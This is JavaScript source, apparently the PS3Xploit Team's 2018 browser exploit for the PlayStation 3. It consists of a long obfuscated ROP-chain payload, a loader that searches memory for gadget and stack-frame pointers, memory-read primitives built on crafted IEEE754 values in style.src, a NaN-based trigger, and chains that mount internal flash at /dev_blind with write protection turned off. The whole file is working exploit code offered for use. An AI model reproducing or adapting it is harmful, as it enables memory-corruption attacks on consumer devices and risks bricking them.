40\uF142\uFF44\uF446\uF748\uF350\uF152\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768\uF970\uF172\uFF74\uF576")+hexw2bin(pad4)+hexw2bin(a25_r3)+hexw2bin(pad4)+hexw2bin(a25_r30)+hexw2bin(pad4)+hexw2bin(a25_r31)+unescape("\uF4A1\uF2A3\uF4A5\uF6A7\u48A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a25_jumpto)+unescape("\u38B9\u0ABB\u0CBD\u0EBF\u30C1\u02C3\u00C5\u36C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u38D9\u0ADB\u0CDD\u0EDF\u30E1\u02E3\u00E5\u06E7\u48E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u36F7\u58F9\u4AFB\u0CFD\u0EFF\u6FFF\u0102\u0300\u0D06\u0708\u0910\u0112\u3310\u0516\u0718")+hexw2bin(a26_r11)+hexw2bin(a26_r10)+hexw2bin(a26_r8)+hexw2bin(a26_r7)+hexw2bin(a26_r6)+hexw2bin(a26_r5)+hexw2bin(a26_r4)+unescape("\u4748\u0950")+hexw2bin(a26_r9)+unescape("\u0556\u0758\u0960\u0162\u0364\u0566\u0768\u0970")+hexw2bin(pad4)+hexw2bin(a26_r3)+hexw2bin(pad4)+hexw2bin(a26_r30)+hexw2bin(pad4)+hexw2bin(a26_r31)+hexw2bin(pad4)+hexw2bin(restore_stack7)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a26_jumpto)+unescape("\u78D9\u1ADB\u7CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u68E9\u1AEB\u5CED\u1EEF\u10F1\u11F3\u54F5\u16F7\u68F9\u1AFB\u1CFD\u1EFF\u6FFF\u1000\u1101\u1304\u5506\u5708\u1910\u7777\u1314\u1516\u1718\u7910\u8888\u1314\u1516\u1718\u1930\u4131\u5334\u1536\u1738\u1940\u1141\u4344\u1546\u1748\u1950\u1151\u1354\u1556\u4758\u1960\u1161\u1364\u1566\u1768\u4970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u4990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u10B1\u11B3\u14B5\u36B7\u48B9\u1ABB\u1CBD\u1EBF\u60C1\u11C3\u54C5\u56C7\u58C9\u1ACB\u1CCD\u1ECF\u40D1\u11D3\u14D5\u16D7\u88D9\u1ADB\u8CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a27_jumpto)+unescape("\uA0F1\uA2F3\uA4F5\uA6F7\uA8F9\uAAFB\uACFD\uAEFF\uAFFF\uA000\uA102\uA304\uA506\uA708\uA910\uA112\uA314\uA516\uA718\uA920\uA122\uA324\uA526\uA728\uA930\uA132\uA334\uA536\uA738\uA940\uA142\uA344\uA546\uA748\uA950\uA152\uA354\uA556\uA758\uA960\uA162\uA364\uA566\uA768\uA970\uA172\uA374\uA576")+hexw2bin(pad4)+hexw2bin(a28_r3)+hexw2bin(pad4)+hexw2bin(a28_r30)+hexw2bin(pad4)+hexw2bin(a28_r31)+unescape("\uA0A1\uA2A3\uA4A5\uA6A7\uA8A9\uAAAB\uACAD\uAEAF")+hexw2bin(pad4)+hexw2bin(a28_jumpto)+unescape("\u98B9\uBABB\uBCBD\uBEBF\uB0C1\uB2C3\uB4C5\uB6C7\uB8C9\uBACB\uBCCD\uBECF\uB0D1\uB2D3\uB4D5\uB6D7\uB8D9\uBADB\uBCDD\uBEDF\uB0E1\uB2E3\uB4E5\uB6E7\uB8E9\uBAEB\uBCED\uBEEF\uB0F1\uB2F3\uB4F5\uB6F7\uB8F9\uBAFB\uBCFD\uBEFF\uBFFF\uB102\uB304\uB506\uB708\uB910\uB112\uB314\uB516\uB718")+hexw2bin(a29_r11)+hexw2bin(a29_r10)+hexw2bin(a29_r8)+hexw2bin(a29_r7)+hexw2bin(a29_r6)+hexw2bin(a29_r5)+hexw2bin(a29_r4)+unescape("\uB748\uB950")+hexw2bin(a29_r9)+unescape("\uB556\uB758\uB960\uB162\uB364\uB566\uB768\uB970")+hexw2bin(pad4)+hexw2bin(a29_r3)+hexw2bin(pad4)+hexw2bin(a29_r30)+hexw2bin(pad4)+hexw2bin(a29_r31)+hexw2bin(pad4)+hexw2bin(restore_stack)+unescape("\uA2A3\uA4A5\uA6A7\uA8A9")+hexw2bin(pad4)+hexw2bin(a29_jumpto)+unescape("\uC8D9\uCADB\uCCDD\uCEDF\uC0E1\uC2E3\uC4E5\uC6E7\uC8E9\uCAEB\uCCED\uCEEF\uC0F1\uC2F3\uC4F5\uC6F7\uC8F9\uCAFB\uCCFD\uCEFF\uCFFF\uC000\uC102\uC304\uC506\uC708\uC910\uC112\uC314\uC516\uC718\uC920\uC122\uC324\uC526\uC728\uC930\uC132\uC334\uC536\uC738\uC940\uC142\uC344\uC546\uC748\uC950\uC152\uC354\uC556\uC758\uC960\uC162\uC364\uC566\uC768\uC970\uC172\uC374\uC576\uC778\uC980\uC182\uC384\uC586\uC788\uC990\uC192\uC394\uC596\uC798\uC900\uC0A1\uC2A3\uC4A5\uC6A7\u68A9\uCAAB\uCCAD\uCEAF\uC0B1\uC2B3\uC4B5\uC6B7\uC8B9\uCABB\uCCBD\uCEBF\uC0C1\uC2C3\uC4C5\uC6C7\uC8C9\uCACB\uCCCD\uCECF\uC0D1\uC2D3\uC4D5\uC6D7\uC8D9\uCADB\uCCDD\uCEDF\uC0E1\uC2E3\uC4E5\uC6E7")+hexw2bin(pad4)+hexw2bin(a30_jumpto)+unescape("\uD0F1\uD2F3\uD4F5\uD6F7\uD8F9\uDAFB\uDCFD\uDEFF\uDFFF\uD000\uD102\uD304\uD506\uD708\uD910\uD112\uD314\uD516\uD718\uD920\uD122\uD324\uD526\uD728\uD930\uD132\uD334\uD536\uD738\uD940\uD142\uD344\uD546\uD748\uD950\uD152\uD354\uD556\uD758\uD960\uD162\uD364\uD566\uD768\uD970\uD172\uD374\uD576")+hexw2bin(pad4)+hexw2bin(a31_r3)+hexw2bin(pad4)+hexw2bin(a31_r30)+hexw2bin(pad4)+hexw2bin(a31_r31)+unescape("\uD0A1\uD2A3\uD4A5\uD6A7\uD8A9\uDAAB\uDCAD\uDEAF")+hexw2bin(pad4)+hexw2bin(a31_jumpto)+unescape("\u98B9\uEABB\uECBD\uEEBF\uE0C1\uE2C3\uE4C5\uE6C7\uE8C9\uEACB\uECCD\uEECF\uE0D1\uE2D3\uE4D5\uE6D7\uE8D9\uEADB\uECDD\uEEDF\uE0E1\uE2E3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF\uE0F1\uE2F3\uE4F5\uE6F7\uE8F9\uEAFB\uECFD\uEEFF\uEFFF\uE102\uE304\uE506\uE708\uE910\uE112\uE314\uE516\uE718")+hexw2bin(a32_r11)+hexw2bin(a32_r10)+hexw2bin(a32_r8)+hexw2bin(a32_r7)+hexw2bin(a32_r6)+hexw2bin(a32_r5)+hexw2bin(a32_r4)+unescape("\uE748\uE950")+hexw2bin(a32_r9)+unescape("\uE556\uE758\uE960\uE162\uE364\uE566\uE768\uE970")+hexw2bin(pad4)+hexw2bin(a32_r3)+hexw2bin(pad4)+hexw2bin(a32_r30)+hexw2bin(pad4)+hexw2bin(a32_r31)+hexw2bin(pad4)+hexw2bin(restore_stack)+unescape("\uD2A3\uD4A5\uD6A7\uD8A9")+hexw2bin(pad4)+hexw2bin(a32_jumpto)+unescape("\uF8D9\uFADB\uFCDD\uFEDF\uF0E1\uF2E3\uF4E5\uF6E7\uF8E9\uFAEB\uFCED\uFEEF\uF0F1\uF2F3\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\uF000\uF102\uF304\uF506\uF708\uF910\uF112\uF314\uF516\uF718\uF920\uF122\uF324\uF526\uF728\uF930\uF132\uF334\uF536\uF738\uF940\uF142\uF344\uF546\uF748\uF950\uF152\uF354\uF556\uF758\uF960\uF162\uF364\uF566\uF768\uF970\uF172\uF374\uF576\uF778\uF980\uF182\uF384\uF586\uF788\uF990\uF192\uF394\uF596\uF798\uF900\uF0A1\uF2A3\uF4A5\uF6A7\u68A9\uFAAB\uFCAD\uFEAF\uF0B1\uF2B3\uF4B5\uF6B7\uF8B9\uFABB\uFCBD\uFEBF\uF0C1\uF2C3\uF4C5\uF6C7\uF8C9\uFACB\uFCCD\uFECF\uF0D1\uF2D3\uF4D5\uF6D7\uF8D9\uFADB\uFCDD\uFEDF\uF0E1\uF2E3\uF4E5\uF6E7")+hexw2bin(pad4)+hexw2bin(a33_jumpto));
}

function syscallGadgetSetEndBytes()
{
    return unescape("\u4141\uBE7E");
}

function addbytes(size)
{
    switch(size)
    {
        case "2":
        return unescape("\4141");
        break;
        case "4":
        return unescape("\4141\u4242");
        break;
        case "8":
        return unescape("\4141\u4242\u4343\u4444");
        break;
        case "16":
        return unescape("\4141\u4242\u4343\u4444\4545\u4646\u4747\u4848");
        break;
    }
}

// PS3 Default Template ROP Chain Loader
// PS3Xploit Team 2018 / ps3xploit.com


//function initROP(type)
function initROP()
{
    try
    {
        // ==============================================================================
        // Set basic defaults for each loop
        initRopDefaults();
            
        // Check to make sure values are not corrupt
        checkSearchParams();
            
        if(firstRun)
        {
            
            // Reset Addresses
            resetOffsetAddresses();
            
            //Set Pointer Values
            setDefaultPointerValues();
            setCustomPointerValues();
    
            //removeElement("rop_chain_view", true);
            
            // Prevent Running More Than Once
            firstRun=false;
        }
        // ==============================================================================
        
        
        // ==============================================================================
        // Find File Pointers
        showFoundOffsets(offset_find_base_fp);
        if((!base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found)){base_found=findBase();}
        showFoundOffsets(offset_find_base_fp);
        
        // Find Stackframe Pointer
        showFoundOffsets(offset_find_stack_frame);
        if((base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found)){stackframe_found=findStackFrame();}
        showFoundOffsets(offset_find_stack_frame);
        
        // Find Jump 2 Pointer
        showFoundOffsets(offset_find_jump2);
        if((base_found)&&(stackframe_found)&&(!j2_found)&&(!j1_found)){j2_found=findJump2();}
        showFoundOffsets(offset_find_jump2);
        
        // Find Jump 1 Pointer
        showFoundOffsets(offset_find_jump1);
        if((base_found)&&(stackframe_found)&&(j2_found)&&(!j1_found)){j1_found=findJump1();}
        showFoundOffsets(offset_find_jump1);
        // ==============================================================================
        
        
        // ==============================================================================
        if((base_found)&&(stackframe_found)&&(j2_found)&&(j1_found)){allOffsetsFound=true;showFoundOffsets(offset_find_success);}
        
        // Trigger Exploit
        if(!allOffsetsVerified){verifyOffsets();}
        
        if(allOffsetsVerified)
        {
            // Land here ONLY when all offsets are verified
            verifySuccessTrigger();
        }
        else 
        {
            verifyFailTrigger();
        }
        // ==============================================================================
        
        // Log Crap For Garbage Collection
        logForGC();
    } 
    catch(e) 
    {
        if(debug_mode){logAdd(e, log_div);}
    }
}

// PS3 Exploit Template
// PS3Xploit Team 2018 / ps3xploit.com


Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}

function fromIEEE754(bytes, ebits, fbits)
{
    var retNumber = 0;
    var bits = [];
    for (var i = bytes.length; i; i -= 1)
    {
        var byte = bytes[i - 1];
        for (var j = 8; j; j -= 1)
        {
            bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
        }
    }
    bits.reverse();
    var str = bits.join('');
    var bias = (1 << (ebits - 1)) - 1;
    var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
    var e = parseInt(str.substring(1, 1 + ebits), 2);
    var f = parseInt(str.substring(1 + ebits), 2);
    if (e === (1 << ebits) - 1)
    {
        retNumber = f !== 0 ? NaN : s * Infinity;
    }
    else if (e > 0)
    {
        retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
    }
    else if (f !== 0)
    {
        retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
    }
    else
    {
        retNumber = s * 0;
    }
    return retNumber.noExponents();
}

function generateIEEE754(address, size)
{
    var hex = new Array
    (
        (address >> 24) & 0xFF,
        (address >> 16) & 0xFF,
        (address >> 8) & 0xFF,
        (address) & 0xFF,
        
        (size >> 24) & 0xFF,
        (size >> 16) & 0xFF,
        (size >> 8) & 0xFF,
        (size) & 0xFF
    );
    return fromIEEE754(hex, 11, 52);
}

function generateExploit(address, size)
{
    var n = (address<<32) | ((size>>1)-1);
    return generateIEEE754(address, (n-address));
}

function readMemory(address, size)
{
    if(document.getElementById('exploit'))document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";
    else logAdd(msg_malformed_html);
}

function checkMemory(address, size, len, sub)
{
    if(size<len){throw msg_chk_mem_arg_error+size.toString(16)+" < len=0x"+size.toString(16);logAdd(msg_chk_mem_arg_error+size.toString(16)+" < len=0x"+size.toString(16));}
    if(document.getElementById('exploit'))
    {
        readMemory(address, size);
        if(debug_mode)
        {
            var x=document.getElementById('exploit').style.src.substr(sub,len);
            logAdd(msg_check_memory+s2hex(x));
            return x;
        }
        return document.getElementById('exploit').style.src.substr(sub,len);
    }
    else logAdd(msg_malformed_html);
}

/*
function findJsVariableOffset(name,exploit_data,base,size,debug_mode)
{
    readMemory(base,size);
    var dat=document.getElementById('exploit').style.src.substr(6,size);
    for (var i=0;i<(dat.length*2);i+=0x10)  {
        if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
        {
            var match=0;
            for (var k=0;k<(exploit_data.length*2);k+=0x2)
            {
                if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2))break;
                match+=1;
            }
            if (match===exploit_data.length)
            {
                var exploit_addr=base+i+4;
                if(debug_mode){logAdd(name+"<font color=%22yellow%22>"+msg_string_located+exploit_addr.toString(16).toUpperCase()+"<br>"+name+" Hex: "+s2hex(exploit_data).toString().toUpperCase()+"</font>");}
                return exploit_addr;
            }
        }
    }
    var end_range=base+size;
    if(debug_mode){logAdd("<font color=%22386E38%22>"+name+"</font> <font color=%22386E38%22>"+msg_string_not_located+"</font> <font color=%22386E38%22>0x"+base.toString(16).toUpperCase()+" - 0x"+end_range.toString(16).toUpperCase()+"</font>");}
    return 0;
}
*/

function findJsVariableOffset(name,exploit_data,base,size,debug_mode)
{
    readMemory(base,size);
    var dat=document.getElementById('exploit').style.src.substr(6,size);
    var i=0;
    var t;
    var k;
    var match;
    var exploit_addr;
    while(i<(dat.length*2))
    {
        if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
        {
            match=0;
            for (k=0;k<(exploit_data.length*2);k+=0x2)
            {
                if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
                match+=1;
            }
            if (match===exploit_data.length)
            {
                exploit_addr=base+i+4;
                
                for(t=0;t<found_offsets.length;t+=1)
                {
                    if(found_offsets[t]===exploit_addr)
                    {
                        if(debug_mode){logAdd("<font color=%22386E38%22>Found "+name+" at: 0x"+exploit_addr.toString(16)+br+": Offset already used!</font>");}
                        return -1;
                    }
                }
                found_offsets.push(exploit_addr);
                if(debug_mode){logAdd("<font color=%22yellow%22>Found "+name+" at: 0x"+exploit_addr.toString(16)+br+exploit_data.toAscii(true)+"</font>");}
                return exploit_addr;
            }
        }
        i+=0x10;
    }
    var end_range=base+size;
    if(debug_mode){logAdd("<font color=%22386E38%22>"+name+"</font> <font color=%22386E38%22>"+msg_string_not_located+"</font> <font color=%22386E38%22>0x"+base.toString(16).toUpperCase()+" - 0x"+end_range.toString(16).toUpperCase()+"</font>");}
    return 0;
}

function trigger(exploit_addr){
    var span = document.createElement("div");
    document.getElementById("BodyID").appendChild(span);
    span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function execTrigger()
{
    if(!disable_trigger)
    {
        switch(chain_stackframe)
        {
            case "mem_dump_test":
            showWaitMessage("");
            break;
            
            default:
            showWaitMessage("");
            break;
        }
        
        setTimeout(trigger,1000,jump_1_addr);
        
        msg_success_text=success_chain_exec;
        
        // Override success message
        execSuccessMessage(chain_stackframe);
        
        setTimeout(chainSucceed,2000,msg_success_text);
        postExecTasks(chain_stackframe);
    }
    else{
        msg=trigger_msg2 + jump_1_addr.toString(16).toUpperCase();
        setTimeout(alert,1000,msg);
    }
}

function chainSelection2(){
    chain_stackframe = "sys_fs_mount";
    
    // Set Which Searches Need To Happen To Find Pointers
    setChainOptions(chain_stackframe);
    
    return chain_stackframe;
}

function mount_FLSH1_FAT_DevBlind(){
    mount_device = "CELL_FS_IOS:BUILTIN_FLSH1";
    mount_fs = "CELL_FS_FAT";
    mount_path = "/dev_blind";
    setValueToHTML("marked_hex_storage","sys_fs_mount");
    setValueToHTML("mounting_device",mount_device);
    setValueToHTML("mounting_fs",mount_fs);
    setValueToHTML("mounting_path",mount_path);
    setValueToHTML("path_src",mount_device);
    setValueToHTML("path_dest",mount_path);
    setValueToHTML("file_size_edit",mount_fs);
    fs_mount_write_protection=0x00000000;
    write_protect=false;
    alert(msg_warning_write_protection);
    alert(mount_device + "\n" + mount_fs + "\n" + mount_path + "\n" + write_protect);
}



function chainSelection3(){
    chain_stackframe = "file_read_write_test";
    setValueToHTML("path_src",path_usb_test_bin);
    setValueToHTML("path_dest",path_hdd_test_bin);
    setValueToHTML("file_size_edit",file_size);
    return chain_stackframe;
}





